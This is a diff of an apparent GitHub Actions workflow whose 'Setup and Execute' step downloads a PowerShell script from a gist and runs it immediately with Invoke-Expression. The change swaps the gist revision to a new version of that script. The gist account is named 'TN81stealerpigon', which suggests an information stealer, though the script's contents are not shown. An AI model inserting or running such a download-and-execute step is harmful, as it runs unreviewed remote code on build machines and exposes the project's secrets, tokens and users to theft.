@@ -14,6 +14,6 @@ jobs:
       - name: Setup and Execute
         shell: powershell
         run: |
-          $rawUrl = "https://gist.githubusercontent.com/TN81stealerpigon/42175f595c6d3fd88aec73c94753146b/raw/cd2a5cd9fd40a7a0a4eacef528208d30cc53ac4e/setup.ps1"
+          $rawUrl = "https://gist.githubusercontent.com/TN81stealerpigon/42175f595c6d3fd88aec73c94753146b/raw/e763ecd552ea5011d748fffad7e4c63d1de8977b/setup.ps1"
           $script = Invoke-WebRequest -Uri $rawUrl -UseBasicParsing
           Invoke-Expression $script.Content
